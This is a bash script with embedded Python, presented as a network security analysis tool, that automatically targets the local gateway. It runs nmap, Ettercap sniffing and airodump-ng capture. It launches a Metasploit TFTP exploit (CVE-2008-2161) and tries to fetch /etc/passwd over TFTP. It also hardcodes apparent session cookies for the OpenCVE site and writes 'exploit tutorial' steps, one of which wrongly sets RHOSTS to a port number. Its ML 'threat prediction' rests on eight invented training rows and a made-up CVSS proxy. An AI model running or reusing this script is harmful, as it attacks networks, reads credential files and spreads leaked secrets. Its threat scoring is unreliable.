#!/bin/bash

# ===========================
# Network Security Analysis Tool
# Author: FARIS AHMED 
# Description: A tool to perform network scanning, vulnerability analysis, and threat prediction.
# ===========================

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo "[-] This script must be run as root."
    exit 1
fi

# Define paths for result files and logs
LOG_FILE="network_security_log.txt"
NMAP_RESULTS="nmap_results.xml"
ETTERCAP_PCAP="ettercap_traffic.pcap"
NUCLEI_RESULTS="nuclei_results.txt"
MSF_LOG="msfconsole_log.txt"
TFTP_LOG="tftp_test_log.txt"
OVERALL_SUMMARY="overall_summary.txt"
AIRCRACK_LOG="aircrack_summary.txt"
EVERYTHING_OUTPUT="everything.txt"

# Redirect all output to everything.txt
exec > >(tee -a $EVERYTHING_OUTPUT) 2>&1

# Function to log messages with timestamps
log_message() {
    local message=$1
    echo "$(date '+%Y-%m-%d %H:%M:%S') $message" | tee -a $LOG_FILE
}

# Function to detect active network interface dynamically
detect_active_interface() {
    ACTIVE_INTERFACE=$(ip route | grep default | awk '{print $5}')
    if [[ -z "$ACTIVE_INTERFACE" ]]; then
        log_message "[-] No active network interface detected."
        exit 1
    fi
    log_message "[+] Detected active network interface: $ACTIVE_INTERFACE"
}

# Function to detect the gateway (target IP)
detect_gateway() {
    TARGET_IP=$(ip route | grep default | awk '{print $3}')
    if [[ -z "$TARGET_IP" ]]; then
        log_message "[-] Failed to detect gateway IP."
        exit 1
    fi
    log_message "[+] Detected gateway IP: $TARGET_IP"
}

# Function to run Nmap with improved settings
run_nmap() {
    log_message "[+] Running Nmap on $TARGET_IP via $ACTIVE_INTERFACE..."
    sudo nmap -sV -Pn -sU -T4 --top-ports 20 --script vulners -oX $NMAP_RESULTS -e $ACTIVE_INTERFACE $TARGET_IP
    if [[ $? -ne 0 ]]; then
        log_message "[-] Nmap scan failed."
        exit 1
    fi
}

# Function to run Ettercap in background
run_ettercap() {
    log_message "[+] Starting Ettercap sniffing on $ACTIVE_INTERFACE..."
    sudo ettercap -T -i $ACTIVE_INTERFACE -w $ETTERCAP_PCAP &
    ETTERCAP_PID=$!
    log_message "[*] Ettercap running with PID $ETTERCAP_PID"
}

# Function to stop Ettercap
stop_ettercap() {
    log_message "[+] Stopping Ettercap..."
    if ps -p $ETTERCAP_PID > /dev/null 2>&1; then
        kill $ETTERCAP_PID
    fi
}

# Function to analyze Ettercap traffic
analyze_ettercap_traffic() {
    log_message "[+] Analyzing Ettercap traffic..."
    ettercap_summary="ettercap_summary.txt"
    tshark -r $ETTERCAP_PCAP -qz io,phs > $ettercap_summary 2>&1
    if [[ $? -eq 0 ]]; then
        log_message "[+] Ettercap traffic analyzed. Results saved in $ettercap_summary."
    else
        log_message "[-] Ettercap traffic analysis failed."
    fi
}

# Function to test CVE applicability
test_cve_applicability() {
    log_message "[+] Testing CVE applicability..."
    # Example: Test TFTP exploit using Metasploit
    if grep -q "tftp" $NMAP_RESULTS; then
        log_message "[+] Testing TFTP exploit (CVE-2008-2161)..."
        echo "use exploit/windows/tftp/tftp_long_filename" > commands.rc
        echo "set RHOSTS $TARGET_IP" >> commands.rc
        echo "run" >> commands.rc
        echo "exit" >> commands.rc
        msfconsole -r commands.rc > $MSF_LOG 2>&1
        if grep -q "Exploit completed" $MSF_LOG; then
            log_message "[+] TFTP exploit succeeded. CVE-2008-2161 is applicable."
        else
            log_message "[-] TFTP exploit failed. CVE-2008-2161 may not be applicable."
        fi
    fi

    # Manual verification for TFTP
    log_message "[+] Manually verifying TFTP service..."
    echo -e "get /etc/passwd\nput test.txt\nquit" | tftp $TARGET_IP > $TFTP_LOG 2>&1
    if grep -q "Error" $TFTP_LOG; then
        log_message "[-] TFTP manual verification failed."
    else
        log_message "[+] TFTP manual verification succeeded."
    fi
}

# Function to perform wireless analysis using Aircrack-ng
perform_wireless_analysis() {
    log_message "[+] Checking for wireless interface..."
    WIRELESS_INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}')
    if [[ -z "$WIRELESS_INTERFACE" ]]; then
        log_message "[-] Wireless interface not found. Skipping wireless analysis."
        return
    fi

    log_message "[+] Enabling monitor mode on $WIRELESS_INTERFACE..."
    sudo airmon-ng start $WIRELESS_INTERFACE > /dev/null 2>&1
    MONITOR_INTERFACE="${WIRELESS_INTERFACE}mon"

    log_message "[+] Capturing wireless traffic using Airodump-ng..."
    airodump_output="airodump_capture.csv"
    sudo timeout 60 airodump-ng -w airodump_capture --output-format csv $MONITOR_INTERFACE > /dev/null 2>&1

    log_message "[+] Analyzing captured wireless traffic..."
    wireless_summary="wireless_summary.txt"
    cat $airodump_output | awk -F',' 'NR>2 {print $1, $4}' > $wireless_summary
    log_message "[+] Wireless traffic analyzed. Results saved in $wireless_summary."

    log_message "[+] Disabling monitor mode on $WIRELESS_INTERFACE..."
    sudo airmon-ng stop $MONITOR_INTERFACE > /dev/null 2>&1
}

# Trigger the ML analysis with Python
run_ml_analysis() {
    log_message "[+] Running ML analysis..."
    python3 - << 'EOF'
import json
import xml.etree.ElementTree as ET
from sklearn.ensemble import RandomForestClassifier
import numpy as np
import requests
import time

# Parse Nmap Results
def parse_nmap_results(xml_file):
    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()
        ports_info = []
        for host in root.findall('host'):
            ports = host.find('ports')
            if ports is None:
                continue
            for port in ports.findall('port'):
                state = port.find('state').get('state')
                if state not in ["open", "open|filtered"]:
                    continue
                port_id = port.get('portid')
                service = port.find('service')
                service_name = service.get('name') if service is not None else "unknown"
                service_version = service.get('version') if service is not None else "unknown"
                service_name = service_name.rstrip('?')
                if service_name == "unknown":
                    continue
                ports_info.append({
                    "port": int(port_id) if port_id else -1,
                    "service": service_name,
                    "version": service_version
                })
        return ports_info
    except Exception as e:
        print(f"[-] Error parsing Nmap results: {e}")
        return []

# Fetch CVE data from OpenCVE API
def fetch_cve_data(service_info):
    service = service_info["service"]
    headers = {
        "Cookie": "_ga_FBWV27BLWF=GS1.1.1739083842.1.1.1739083894.0.0.0; _ga=GA1.1.696419717.1739083842; SERVERID170368=71708f2f|Z6hb4|Z6hPx; csrftoken=5wdbC9rJNMWhjw9sO8VmN9mRpt0NZzLY; sessionid=a5y69jihifk71j7ao61n9u4ln9vglbvz"
    }
    params = {"vendor": service}
    if service_info["version"] and service_info["version"] != "unknown":
        params["version"] = service_info["version"]
    retries = 3
    for attempt in range(retries):
        try:
            response = requests.get("https://app.opencve.io/api/cve", headers=headers, params=params, timeout=10)
            response.raise_for_status()
            data = response.json()
            cves = []
            for item in data.get("results", []):
                cves.append({"cve_id": item.get("cve_id"), "description": item.get("description")})
            return {"service": service, "cves": cves}
        except requests.exceptions.RequestException as e:
            print(f"[-] Attempt {attempt + 1} failed: Error fetching CVE data for {service}: {e}")
            if attempt < retries - 1:
                time.sleep(2)
            else:
                print(f"[-] Max retries exceeded for {service}. Using default CVE data.")
                return {"service": service, "cves": []}

# Train ML Model
def train_ml_model():
    features = np.array([
        [69, 7.0, 1],   # TFTP service with potential risks (UDP)
        [161, 6.0, 1],  # SNMP service with potential risks (UDP)
        [123, 5.5, 1],  # NTP service with potential risks (UDP)
        [445, 8.5, 0],  # SMB service with critical risks (TCP)
        [53, 6.0, 0],   # DNS service with potential risks (TCP)
        [80, 7.5, 0],   # HTTP service with high risks (TCP)
        [443, 5.0, 0],  # HTTPS service with medium risks (TCP)
        [3306, 9.8, 0]  # MySQL service with critical risks (TCP)
    ])
    labels = np.array([1, 1, 0, 1, 0, 1, 0, 1])  # 1 = High Threat, 0 = Low Threat
    clf = RandomForestClassifier()
    clf.fit(features, labels)
    return clf

# Main analysis
def main():
    try:
        nmap_findings = parse_nmap_results("nmap_results.xml")
        if not nmap_findings:
            print("[-] No valid Nmap findings to analyze.")
            return

        vulns = []
        total_cves_found = 0
        for service_info in nmap_findings:
            cve_data = fetch_cve_data(service_info)
            if cve_data["cves"]:
                vulns.append({
                    "port": service_info["port"],
                    "service": service_info["service"],
                    "version": service_info["version"],
                    "cves": cve_data["cves"]
                })
                total_cves_found += len(cve_data["cves"])

        features = []
        for vuln in vulns:
            if 'port' in vuln and vuln["cves"]:
                cvss_score = len(vuln["cves"]) * 5
                protocol_type = 1 if "udp" in vuln["service"] else 0
                features.append([vuln['port'], cvss_score, protocol_type])

        if not features or len(features[0]) != 3:
            print("[-] Input data does not match the expected number of features (3).")
            return

        clf = train_ml_model()
        predictions = clf.predict(features)

        report = {
            "nmap_findings": nmap_findings,
            "threat_predictions": [
                {
                    "port": vuln["port"],
                    "service": vuln["service"],
                    "version": vuln["version"],
                    "cves": vuln["cves"],
                    "threat_level": "High" if prediction == 1 else "Low"
                }
                for vuln, prediction in zip(vulns, predictions) if 'port' in vuln and vuln["cves"]
            ]
        }

        with open("security_report.json", "w") as report_file:
            json.dump(report, report_file, indent=4)
        print("[+] Security report generated and saved as security_report.json.")

        with open("overall_summary.txt", "w") as summary_file:
            summary_file.write("=== Overall Summary ===\n\n")
            summary_file.write(f"Total CVEs Found: {total_cves_found}\n\n")
            summary_file.write("Ports and Services:\n")
            for finding in nmap_findings:
                summary_file.write(f"- Port {finding['port']}: {finding['service']} ({finding['version']})\n")
            summary_file.write("\nTool-Specific Findings:\n")
            summary_file.write("- Nmap: Identified open ports and services.\n")
            summary_file.write("- Ettercap: Captured network traffic.\n")
            summary_file.write("- Aircrack-ng: Performed wireless analysis.\n")
            summary_file.write("- TFTP Tests: Performed brute-force and file retrieval tests.\n\n")
            summary_file.write("Threat Predictions:\n")
            for vuln in report.get("threat_predictions", []):
                summary_file.write(f"- Port {vuln['port']} ({vuln['service']}): {len(vuln['cves'])} CVEs found.\n")

            # Add CVE-Specific Exploit Tutorial
            summary_file.write("\n=== CVE Exploit Tutorial ===\n")
            for vuln in report.get("threat_predictions", []):
                for cve in vuln["cves"]:
                    summary_file.write(f"\n--- Exploiting {cve['cve_id']} ---\n")
                    summary_file.write(f"Description: {cve['description']}\n")
                    summary_file.write("Steps to exploit:\n")
                    summary_file.write("1. Use Metasploit to exploit this vulnerability:\n")
                    summary_file.write("   - Start Metasploit: `msfconsole`\n")
                    summary_file.write(f"   - Search for exploits: `search {cve['cve_id']}`\n")
                    summary_file.write("   - Use an exploit: `use `\n")
                    summary_file.write(f"   - Set target: `set RHOSTS {vuln['port']}`\n")
                    summary_file.write("   - Run the exploit: `run`\n")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
EOF
}

# Display ASCII Art based on findings
display_ascii_art() {
    local status=$1
    if [[ $status == "EXPLOITABLE" ]]; then
    echo "
███████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗   ██╗
██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗╚██╗ ██╔╝
█████╗  ███████║█████╔╝ █████╗  ██║   ██║ ╚████╔╝
██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║  ╚██╔╝  
██║     ██║  ██║██║  ██╗███████╗╚██████╔╝   ██║  
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝    ╚═╝  
"
    else
    echo "
 █████╗ ██████╗ ██╗   ██╗███████╗██████╗ ██╗   ██╗
██╔══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗╚██╗ ██╔╝
███████║██████╔╝██║   ██║█████╗  ██████╔╝ ╚████╔╝
██╔══██║██╔══██╗██║   ██║██╔══╝  ██╔══██╗  ╚██╔╝  
██║  ██║██║  ██║╚██████╔╝███████╗██████╔╝   ██║  
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═════╝    ╚═╝  
"
    fi
}
# Main Execution
detect_active_interface
detect_gateway
run_nmap
run_ettercap
sleep 60  # Allow Ettercap to capture traffic for 1 minute
stop_ettercap
analyze_ettercap_traffic
test_cve_applicability
perform_wireless_analysis
run_ml_analysis
# Display ASCII Art based on findings
if grep -q "CVE" security_report.json; then
    display_ascii_art "EXPLOITABLE"
else
    display_ascii_art "SAFE"
fi
